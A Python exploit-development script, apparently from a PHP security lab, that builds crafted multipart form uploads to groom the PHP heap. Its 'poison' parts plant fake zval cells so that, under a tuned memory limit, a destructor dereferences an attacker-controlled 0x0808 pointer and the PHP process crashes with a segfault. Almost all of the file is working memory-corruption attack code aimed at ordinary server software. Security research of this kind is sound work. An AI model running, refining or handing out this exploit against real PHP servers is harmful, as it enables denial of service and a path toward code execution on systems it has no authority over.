#!/usr/bin/env python3
"""oom41: late-poison kill — climb(1900 parts) -> POISON PHASE (5 transients,
49-page 0x08 names -> poisoned free run) -> climb(resume). arData-2 carve
(elem 2048) lands on poisoned pages; limit-tuned countdown drops at
elem~3888 = arData-2 page 30 = 0x08s -> dtor derefs 0x0808... -> SEGV RC 139.
usage: oom41.py [limit] [k1=1900] [prep=5]
"""
import re
import subprocess
import sys

exec(open("/tmp/phplab/oom39.py").read().replace('if __name__ == "__main__":', 'if False:'))

NAMELEN = 3064


def key_part(i):
    head = (b'--BOUND\r\nContent-Disposition: form-data; name="p' + b"K" * (NAMELEN - 8) +
            (b"%d" % i) + b'[x]"\r\n\r\n')
    return head + b"v\r\n"


def poison_part(n, poison):
    # zval-shaped poison: 16B cell = value ptr 0x0808.., type byte 0x08
    # (IS_OBJECT), flags byte 0x01 (IS_TYPE_REFCOUNTED) -> dtor takes the
    # object branch and derefs the 0x08 pointer.
    cell = bytes([8, 8, 8, 8, 8, 8, 8, 8, 8, 1, 8, 8, 8, 8, 8, 8])
    nm = b"q" + cell * ((poison - 10) // 16) + (b"%06d" % n)
    return b'--BOUND\r\nContent-Disposition: form-data; name="' + nm + b'"\r\n\r\nv\r\n'


def build41(k1=1900, prep=5, poison=200000):
    ps = [key_part(i) for i in range(k1)]
    ps += [poison_part(n, poison) for n in range(prep)]
    ps += [key_part(i) for i in range(k1, 4200)]
    ps.append(b"--BOUND--\r\n")
    return b"".join(ps)


def decode41(limit, k1, prep, poison):
    rc, tr = run(build41(k1, prep, poison), limit)
    commits = [(m.start(), m.group(2), m.group(3))
               for m in re.finditer(r"TRACE keycommit stage=(\d+) elem=(\d+) free=(\d+)", tr)]
    ok_positions = [m.start() for m in re.finditer(r"TRACE keyok", tr)]
    last = commits[-1] if commits else None
    key_death = last is not None and not any(p > last[0] for p in ok_positions)
    tried = re.findall(r"tried to allocate (\d+) bytes", tr)
    rcnum = rc.replace("RC=", "")
    if key_death or rcnum == "139":
        i = tr.rfind("TRACE keycommit")
        print("lim=%d rc=%s %s elem=%s free=%s tried=%s" %
              (limit, rcnum, "*** KEY DEATH ***" if key_death else "post-cycle",
               last[1] if last else "-", last[2] if last else "-",
               tried[-1] if tried else "-"), flush=True)
        if rcnum == "139":
            print("*** SEGV — CORRUPTION MATERIALIZED (RC 139) ***")
        else:
            ctx = [l for l in tr[max(0, i - 500):i + 200].splitlines()
                   if ("TRACE" in l or "tried" in l or "Allowed" in l)][-10:]
            print("\n".join(ctx))
        print("---")
        return True
    tag = "fatal:" + (tried[-1] if tried else "?") if "Allowed memory" in tr else "survive"
    print("lim=%d rc=%s %s commits=%d oks=%d" %
          (limit, rcnum, tag, len(commits), len(ok_positions)), flush=True)
    return False


if __name__ == "__main__":
    lim = int(sys.argv[1]) if len(sys.argv) > 1 else 20_600_000
    k1 = int(sys.argv[2]) if len(sys.argv) > 2 else 1990
    prep = int(sys.argv[3]) if len(sys.argv) > 3 else 3
    poison = int(sys.argv[4]) if len(sys.argv) > 4 else 163840
    decode41(lim, k1, prep, poison)
